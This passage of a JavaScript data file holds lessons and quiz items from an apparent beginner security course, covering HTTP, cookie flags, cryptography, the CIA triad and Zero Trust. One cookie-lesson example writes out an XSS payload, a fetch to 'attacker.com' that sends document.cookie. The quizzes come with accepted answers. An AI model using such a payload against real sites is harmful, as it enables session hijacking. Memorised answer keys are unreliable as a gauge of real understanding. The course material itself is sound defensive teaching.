          question: "A firewall that monitors the ongoing state of active network connections rather than evaluating packets in isolation is known as what type of firewall?",
          acceptedAnswers: ["stateful", "Stateful", "stateful firewall", "Stateful Firewall"],
          answerLength: 8,
          hint: "Opposite of stateless...",
          explanation: "Stateful firewalls track the full lifecycle of connections (TCP handshakes, UDP sessions) in dynamic state tables.",
          xp: 25
        }
      ]
    },

    // =========================================================================
    // STAGE 4: WEB SECURITY & APPLIED CRYPTOGRAPHY (ps-room-10 to ps-room-12)
    // =========================================================================
    {
      id: "ps-room-10",
      legacyId: "room-10",
      order: 10,
      stageId: "ps-stage-04",
      stageTitle: "Web Security & Applied Cryptography",
      stageOrder: 4,
      title: "Web Architecture, HTTP Protocol & Session Security",
      tagline: "HTTP Methods, Status Codes, Request/Response Headers & Cookies",
      description: "Master foundational web application mechanics: the Hypertext Transfer Protocol (HTTP/1.1 and HTTP/2), request methods (GET, POST), status codes, security response headers, cookies, and session state boundaries.",
      difficulty: "Foundational",
      estimatedMinutes: 30,
      xp: 50,
      prerequisites: ["ps-room-09"],
      whyAreYouHere: "Web applications represent the most widely attacked surface across global organizations; web vulnerabilities like XSS, CSRF, and SQLi stem from web protocol design.",
      objectives: [
        "Explain the client-server request/response cycle of HTTP",
        "Categorize HTTP status codes across the 2xx, 3xx, 4xx, and 5xx ranges",
        "Analyze security headers (Content-Security-Policy, HSTS, X-Frame-Options)",
        "Understand cookie flags: HttpOnly, Secure, and SameSite"
      ],
      lessons: [
        {
          id: "ps-task-10-01",
          taskNumber: 1,
          title: "The HTTP Protocol: Requests, Methods & Status Codes",
          concept: "The Hypertext Transfer Protocol (HTTP) is an application-layer protocol operating on a client-server model. HTTP is inherently stateless: the server treats every request as an independent transaction without native memory of previous requests.\n\nAn HTTP Request consists of:\n- Request Line: Method, Path, HTTP Version (e.g., `GET /index.html HTTP/1.1`).\n- Request Headers: Metadata key-value pairs (`Host`, `User-Agent`, `Accept`, `Cookie`, `Authorization`).\n- Optional Body: Data payload (used with POST, PUT, PATCH).\n\nPrimary HTTP Methods:\n- `GET`: Retrieve representation of a resource without side effects.\n- `POST`: Submit data to be processed by the server (form submissions, logins).\n- `PUT` / `PATCH`: Create or update existing resources.\n- `DELETE`: Remove specified resource.\n- `OPTIONS`: Query permitted communication methods (used in CORS preflight).\n\nHTTP Status Code Categories:\n- `1xx` Informational: Protocol handshakes (`101 Switching Protocols`).\n- `2xx` Success: `200 OK`, `201 Created`, `204 No Content`.\n- `3xx` Redirection: `301 Moved Permanently`, `302 Found` (temporary redirect).\n- `4xx` Client Error: `400 Bad Request`, `401 Unauthorized` (missing credentials), `403 Forbidden` (authenticated but denied permission), `404 Not Found`.\n- `5xx` Server Error: `500 Internal Server Error`, `502 Bad Gateway`, `503 Service Unavailable`.",
          whyItMatters: "Analyzing HTTP response codes enables automated tools and human pen testers to map endpoints, discover hidden directories, and spot server failures.",
          examples: [
            "`401 Unauthorized`: Client must authenticate.",
            "`403 Forbidden`: Client identity is known, but access to resource is strictly denied."
          ],
          commands: [
            { cmd: "curl -I https://endlessus.in", desc: "Fetch HTTP response headers only without downloading body payload" },
            { cmd: "curl -v https://endlessus.in", desc: "Perform verbose curl request inspecting TLS handshake and full header exchange" }
          ],
          reviewSummary: {
            coreTakeaway: "HTTP is stateless; status codes signal processing outcomes across success (2xx), redirection (3xx), client fault (4xx), and server fault (5xx).",
            learningOutcome: "Mastered HTTP methods, headers, and status code categories."
          }
        },
        {
          id: "ps-task-10-02",
          taskNumber: 2,
          title: "Session Management & Security Cookie Flags",
          concept: "Because HTTP is stateless, web applications implement Session Management to remember logged-in users across sequential requests. After successful authentication, the server generates a cryptographically random Session ID, stores it in server-side session storage (or a Redis cluster), and issues it to the browser via the `Set-Cookie` HTTP header.\n\nOn subsequent requests, the browser automatically includes this cookie in the `Cookie` header.\n\nCritical Security Cookie Attributes:\n1. `HttpOnly`: Forbids client-side JavaScript from accessing the cookie via `document.cookie`. This provides vital defense-in-depth against Cross-Site Scripting (XSS): even if an attacker executes malicious JavaScript on the page, they cannot steal the session cookie token.\n2. `Secure`: Instructs the browser to ONLY transmit the cookie over encrypted HTTPS connections, preventing plaintext transmission over cleartext HTTP on open Wi-Fi networks.\n3. `SameSite`: Controls whether cookies are sent on cross-site requests, mitigating Cross-Site Request Forgery (CSRF):\n   - `Strict`: Cookie is never sent on cross-site requests.\n   - `Lax`: Default in modern browsers. Sent on safe top-level navigations (clicking a link), but blocked on cross-origin POST requests.\n   - `None`: Cookie sent on all cross-site requests (requires `Secure` attribute).",
          whyItMatters: "Missing `HttpOnly` and `Secure` cookie attributes directly enables session hijacking via XSS and man-in-the-middle packet sniffing.",
          examples: [
            "`Set-Cookie: session_id=abc123xyz; Secure; HttpOnly; SameSite=Lax`",
            "Without `HttpOnly`, an attacker with XSS can execute `fetch('attacker.com?cookie=' + document.cookie)`."
          ],
          commands: [
            { cmd: "curl -I https://learning.endlessus.in | grep -i 'set-cookie'", desc: "Inspect server-issued cookies and security flags" }
          ],
          reviewSummary: {
            coreTakeaway: "Session cookies maintain user state; HttpOnly protects against XSS token theft, while Secure mandates encrypted HTTPS delivery.",
            learningOutcome: "Understood cookie security attributes (HttpOnly, Secure, SameSite) and session security."
          }
        }
      ],
      questions: [
        {
          id: "ps-q-10-01",
          taskId: "ps-task-10-01",
          taskIndex: 0,
          type: "exact",
          question: "Which 3-digit HTTP status code indicates that the server understands the request but explicitly refuses to authorize access?",
          acceptedAnswers: ["403", "403 Forbidden", "403 forbidden"],
          answerLength: 3,
          hint: "Forbidden error code...",
          explanation: "403 Forbidden indicates that the server recognized the client's identity, but permission to access the resource is denied.",
          xp: 25
        },
        {
          id: "ps-q-10-02",
          taskId: "ps-task-10-02",
          taskIndex: 1,
          type: "exact",
          question: "Which HTTP cookie attribute prevents client-side JavaScript (e.g., document.cookie) from accessing the cookie token, mitigating XSS theft?",
          acceptedAnswers: ["HttpOnly", "httponly", "HTTPOnly"],
          answerLength: 8,
          hint: "HTTP Only...",
          explanation: "The HttpOnly flag blocks JavaScript execution from accessing the cookie, preventing attackers from reading session tokens via XSS.",
          xp: 25
        }
      ]
    },

    {
      id: "ps-room-11",
      legacyId: "room-11",
      order: 11,
      stageId: "ps-stage-04",
      stageTitle: "Web Security & Applied Cryptography",
      stageOrder: 4,
      title: "Applied Cryptography, Hashes & Public Key Infrastructure",
      tagline: "Symmetric vs Asymmetric Encryption, Hash Primitives & TLS Certificates",
      description: "Master modern cryptographic primitives: symmetric encryption (AES), asymmetric public-key cryptography (RSA, ECC), cryptographic hash functions (SHA-256 vs broken MD5), digital signatures, and Public Key Infrastructure (PKI / TLS).",
      difficulty: "Foundational",
      estimatedMinutes: 30,
      xp: 50,
      prerequisites: ["ps-room-10"],
      whyAreYouHere: "Cryptography provides confidentiality, data integrity, and non-repudiation across every secure protocol on earth; understanding key exchange is vital for defenders.",
      objectives: [
        "Contrast symmetric ciphers (AES) with asymmetric key pairs (RSA, ECC)",
        "Identify the four mathematical properties of cryptographic hash functions",
        "Understand digital signatures and Certificate Authorities (CAs)",
        "Trace the TLS handshake and forward secrecy"
      ],
      lessons: [
        {
          id: "ps-task-11-01",
          taskNumber: 1,
          title: "Symmetric vs Asymmetric Cryptography",
          concept: "Cryptography secures digital communications through mathematical algorithms (ciphers).\n\n1. Symmetric Encryption (Secret-Key Cryptography):\n- Uses the exact same single secret key for both encryption and decryption (`Plaintext + Key = Ciphertext`, `Ciphertext + Key = Plaintext`).\n- Extremely fast and computationally efficient; ideal for encrypting bulk data (hard drives, live TLS data streams).\n- Key Problem: How do two parties securely share the secret key across an untrusted internet without an eavesdropper intercepting it?\n- Standard: Advanced Encryption Standard (AES) with 128, 192, or 256-bit key lengths.\n\n2. Asymmetric Encryption (Public-Key Cryptography):\n- Uses a mathematically linked Key Pair: a Public Key (distributed openly to anyone) and a Private Key (kept strictly confidential by the owner).\n- Principles:\n  * Encryption: If message is encrypted with Alice's Public Key, ONLY Alice's corresponding Private Key can decrypt it (provides Confidentiality).\n  * Digital Signatures: If Alice signs a message hash with her Private Key, ANYONE with Alice's Public Key can verify Alice authored it and it was not altered (provides Authentication, Integrity, and Non-Repudiation).\n- Algorithms: RSA (based on prime factorization) and Elliptic Curve Cryptography (ECC, based on discrete logarithms on elliptic curves, providing equivalent security with much smaller key sizes).\n- Hybrid Cryptography: Real-world TLS uses asymmetric encryption (ECDHE) only for the initial key exchange handshake to securely agree on a session key, then switches to fast symmetric AES for encrypting all subsequent data.",
          whyItMatters: "Hybrid cryptography combines the secure key distribution of asymmetric ciphers with the high-speed throughput of symmetric ciphers.",
          examples: [
            "Symmetric: AES-256-GCM, ChaCha20.",
            "Asymmetric: RSA 4096, ECDSA, Ed25519."
          ],
          commands: [
            { cmd: "openssl rand -hex 32", desc: "Generate a cryptographically secure 256-bit random symmetric key" }
          ],
          reviewSummary: {
            coreTakeaway: "Symmetric uses one shared key for fast bulk encryption; asymmetric uses public/private pairs for key exchange and digital signatures.",
            learningOutcome: "Contrasted symmetric and asymmetric cryptography and hybrid encryption."
          }
        },
        {
          id: "ps-task-11-02",
          taskNumber: 2,
          title: "Cryptographic Hash Functions & Public Key Infrastructure (PKI)",
          concept: "A Cryptographic Hash Function takes an arbitrary-length input string and produces a fixed-size output digest (e.g., SHA-256 always produces 256 bits / 64 hex characters).\n\nFour Mandatory Properties:\n1. Deterministic: Identical input always produces the identical digest.\n2. One-Way (Pre-image Resistance): Computationally infeasible to reverse the digest back into the original input (`hash(x) = y`, but given `y`, cannot find `x`).\n3. Collision Resistant: Infeasible to find two distinct inputs `m1 != m2` that produce the exact same digest (`hash(m1) == hash(m2)`).\n4. Avalanche Effect: Flipping a single bit in the input radically alters more than 50% of the output digest bits.\n\nLegacy Broken Hashes: MD5 (128-bit) and SHA-1 (160-bit) suffer from demonstrated collision attacks and must NEVER be used for security-critical applications.\n\nPublic Key Infrastructure (PKI):\nHow do you know `google.com`'s public key really belongs to Google, and isn't an attacker impersonating them? Certificate Authorities (CAs) solve this trust problem:\n1. A website generates a key pair and submits a Certificate Signing Request (CSR) to a trusted CA (e.g., Let's Encrypt, DigiCert).\n2. The CA verifies domain ownership and digitally signs the website's public key, creating an X.509 Digital Certificate.\n3. Your operating system and browser come pre-installed with a Root CA Trust Store containing the public keys of trusted CAs, allowing the browser to automatically validate the certificate signature.",
          whyItMatters: "PKI and digital certificates prevent man-in-the-middle attacks across global HTTPS web traffic.",
          examples: [
            "SHA-256: Current industry gold standard for integrity hashing.",
            "MD5 / SHA-1: Mathematically broken; collision vulnerabilities proven."
          ],
          commands: [
            { cmd: "echo -n 'calion' | sha256sum", desc: "Compute the cryptographic SHA-256 digest of a text string" },
            { cmd: "openssl s_client -connect endlessus.in:443 -showcerts", desc: "Examine the live X.509 TLS certificate chain presented by a server" }
          ],
          reviewSummary: {
            coreTakeaway: "Cryptographic hashes verify integrity via one-way avalanche properties; PKI uses Certificate Authorities to cryptographically validate public keys.",
            learningOutcome: "Understood hash integrity, collision resistance, and PKI certificate validation."
          }
        }
      ],
      questions: [
        {
          id: "ps-q-11-01",
          taskId: "ps-task-11-01",
          taskIndex: 0,
          type: "exact",
          question: "In asymmetric cryptography, which key must be kept strictly confidential by the owner to decrypt data and generate digital signatures?",
          acceptedAnswers: ["private key", "Private Key", "private", "Private"],
          answerLength: 11,
          hint: "The private half of the key pair...",
          explanation: "The Private Key is kept secret by the owner and is used to decrypt ciphertexts encrypted with the public key or create digital signatures.",
          xp: 25
        },
        {
          id: "ps-q-11-02",
          taskId: "ps-task-11-02",
          taskIndex: 1,
          type: "exact",
          question: "Which cryptographic property describes when a 1-bit alteration to the input plaintext produces a completely unrecognizable, drastically different hash digest?",
          acceptedAnswers: ["avalanche effect", "avalanche", "Avalanche Effect", "Avalanche"],
          answerLength: 16,
          hint: "Like a mountain avalanche...",
          explanation: "The Avalanche Effect ensures that even a microscopic change to input data drastically shifts the entire output digest, preventing pattern deduction.",
          xp: 25
        }
      ]
    },

    {
      id: "ps-room-12",
      legacyId: "room-12",
      order: 12,
      stageId: "ps-stage-04",
      stageTitle: "Web Security & Applied Cryptography",
      stageOrder: 4,
      title: "The CIA Triad, Threat Landscape & Defensive Posture",
      tagline: "Confidentiality, Integrity, Availability, Attack Vectors & Defense-in-Depth",
      description: "Complete your Pre-Security journey: the CIA Triad, threat actor profiles (script kiddies to APTs), attack taxonomy (phishing, ransomware, zero-days), and foundational defensive architecture (Defense-in-Depth, Least Privilege, Zero Trust).",
      difficulty: "Foundational",
      estimatedMinutes: 30,
      xp: 50,
      prerequisites: ["ps-room-11"],
      whyAreYouHere: "Understanding adversary motivations, core security principles, and defense-in-depth architecture prepares you for specialized Offensive and Defensive cybersecurity tracks.",
      objectives: [
        "Apply the CIA Triad (Confidentiality, Integrity, Availability) to real-world incidents",
        "Categorize threat actor capabilities from opportunists to nation-state APTs",
        "Explain Defense-in-Depth and the Principle of Least Privilege (PoLP)",
        "Understand the core premise of Zero Trust Architecture"
      ],
      lessons: [
        {
          id: "ps-task-12-01",
          taskNumber: 1,
          title: "The CIA Triad & Foundational Security Principles",
          concept: "Information security centers on three pillars known as the CIA Triad:\n1. Confidentiality: Ensuring sensitive data is shielded from unauthorized observation or disclosure. Enforced via encryption (TLS, AES disk encryption), access control lists, and multi-factor authentication (MFA).\n2. Integrity: Guaranteeing data remains authentic, accurate, and protected from unauthorized modification or deletion. Enforced via cryptographic hashes (SHA-256), digital signatures, and file integrity monitoring (FIM).\n3. Availability: Ensuring systems, networks, and data remain accessible to authorized users when needed. Enforced via redundant hardware, automated failover, load balancing, offsite backups, and DDoS mitigation.\n\nTwo Vital Defensive Maxims:\n- Principle of Least Privilege (PoLP): Users, applications, and network components should be granted only the absolute minimum permissions strictly necessary to accomplish their legitimate tasks. If a web server only needs to read files, it must not be given write permissions or root access.\n- Defense-in-Depth (Layered Defense): Security architecture must never rely on a single defensive barrier. An enterprise should deploy layered controls: endpoint EDR + perimeter firewall + network segmentation + least privilege access + multi-factor authentication. If one layer fails, subsequent layers prevent total compromise.",
          whyItMatters: "Every security vulnerability and incident directly violates at least one pillar of the CIA Triad.",
          examples: [
            "Data Breach (stealing credit card database): Breach of Confidentiality.",
            "Ransomware encrypting hospital databases: Breach of Availability.",
            "Attacker altering financial balance records: Breach of Integrity."
          ],
          commands: [
            { cmd: "echo 'Pre-Security Complete!'", desc: "Celebrate finishing the foundational CALION Pre-Security curriculum" }
          ],
          reviewSummary: {
            coreTakeaway: "The CIA Triad guides all defensive policies; Defense-in-Depth and Least Privilege ensure failures do not cause catastrophic compromise.",
            learningOutcome: "Evaluated security incidents against the CIA Triad and defensive principles."
          }
        },
        {
          id: "ps-task-12-02",
          taskNumber: 2,
          title: "Threat Actor Spectrum & Zero Trust Architecture",
          concept: "Defenders must understand the motivations and capabilities of adversaries across the Threat Actor Spectrum:\n- Script Kiddies: Unskilled opportunists using off-the-shelf automated exploit scripts without understanding underlying mechanics.\n- Hacktivists: Ideologically motivated actors seeking political change, defacements, or public leaks.\n- Cybercrime Syndicates: Financially motivated criminal enterprises running Ransomware-as-a-Service (RaaS), credential stuffing, and wire fraud.\n- Advanced Persistent Threats (APTs): Highly funded nation-state intelligence agencies conducting prolonged cyber espionage, critical infrastructure sabotage, and intellectual property theft with custom zero-day exploits.\n\nZero Trust Architecture:\nTraditional cybersecurity relied on the 'Castle-and-Moat' perimeter model: assume everything outside the corporate network firewall is untrusted, but trust everything inside the internal corporate network. Modern cloud environments and remote work render this model obsolete (once an attacker breaches the perimeter via a single phishing email, they move laterally without resistance).\n\nZero Trust operates on one core maxim: 'Never Trust, Always Verify'.\n- Every access request (regardless of whether originating from inside the office or across the internet) is explicitly authenticated, authorized, and encrypted.\n- Continuous authentication and micro-segmentation limit lateral movement.",
          whyItMatters: "Zero Trust prevents adversaries who compromise a single perimeter device from freely pivoting through internal company assets.",
          examples: [
            "Castle-and-Moat: Vulnerable to lateral movement once breached.",
            "Zero Trust: Requires continuous validation, strict microsegmentation, and explicit authorization per resource."
          ],
          commands: [
            { cmd: "tail -n 25 /var/log/auth.log 2>/dev/null || echo 'Reviewing security posture'", desc: "Audit authentication activity for unauthorized access attempts" }
          ],
          reviewSummary: {
            coreTakeaway: "Zero Trust replaces perimeter assumptions with continuous verification and strict microsegmentation.",
            learningOutcome: "Understood threat actor capabilities and Zero Trust security architecture."
          }
        }
      ],
      questions: [
        {
          id: "ps-q-12-01",
          taskId: "ps-task-12-01",
          taskIndex: 0,
          type: "exact",
          question: "Which core pillar of the CIA Triad is directly violated when an adversary unauthorizedly alters financial database records?",
          acceptedAnswers: ["integrity", "Integrity"],
          answerLength: 9,
          hint: "Confidentiality, Integrity, or Availability...",
          explanation: "Integrity ensures data accuracy and trustworthiness. Modifying data without authorization directly violates Integrity.",
          xp: 25
        },
        {
          id: "ps-q-12-02",
          taskId: "ps-task-12-02",
          taskIndex: 1,
          type: "exact",
          question: "What modern cybersecurity paradigm replaces perimeter trust with the foundational rule: 'Never Trust, Always Verify'?",
          acceptedAnswers: ["zero trust", "Zero Trust", "zero trust architecture", "Zero Trust Architecture"],
          answerLength: 10,
          hint: "Zero...",
          explanation: "Zero Trust Architecture operates on 'Never Trust, Always Verify', requiring continuous authentication and microsegmentation for all access requests.",
          xp: 25
        }
      ]
    }
  ];

  // Build lookup map
  const roomMap = {};
  rooms.forEach(r => {
    roomMap[r.id] = r;
    if (r.legacyId) {
      roomMap[r.legacyId] = r;
    }
  });

  const curriculum = {
    id: "calion-pre-sec-v2",
    title: "CALION Pre-Security",
    version: "2.0.0",
    totalRooms: rooms.length,
    stages,
    rooms,
    roomMap
  };

  return {
    curriculum,
    stages,
    rooms,
    roomMap
  };
});
